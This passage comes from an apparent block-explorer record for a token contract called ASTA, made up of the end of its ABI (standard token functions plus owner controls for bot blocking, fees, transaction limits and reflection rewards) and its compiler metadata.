"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"assignAntiBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_check\",\"type\":\"bool\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bots\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimReflection\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"claimReflectionFor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shareholder\",\"type\":\"address\"}],\"name\":\"getUnpaidEarnings\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialFactory\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"isBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBotBlockerEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBotScannerEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBotWreckerEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFeeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReflectionExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTxLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSend\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pair\",\"type\":\"address\"}],\"name\":\"newPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"notBots\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"toggle\",\"type\":\"bool\"}],\"name\":\"setBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setBuyTxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_reflectionFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_teamFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marketingFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeDenominator\",\"type\":\"uint256\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_teamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_marketingReceiver\",\"type\":\"address\"}],\"name\":\"setFeesReceivers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"blocks\",\"type\":\"uint256\"}],\"name\":\"setInitialBlockLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsReflectionExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setIsTxLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_marketingReceiver\",\"type\":\"address\"}],\"name\":\"setMarketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setSellTxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setSwapBackSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_teamReceiver\",\"type\":\"address\"}],\"name\":\"setTeamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setWalletCap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleBotBlocker\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleBotScanner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleBotWrecker\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ASTA", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000003e400f8f109b64011a13ad5827862597f56e63af00000000000000000000000081f8fe3680837cbcbc8076faf326fe1ca00dd0f80000000000000000000000007eb330f97f6a783dfb246ab7312b0c06699ab0d9", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://42f8fa0937387f4e6f4f0a46574f678ab036647aa028bffdc17e7f84d5495cd1"}]}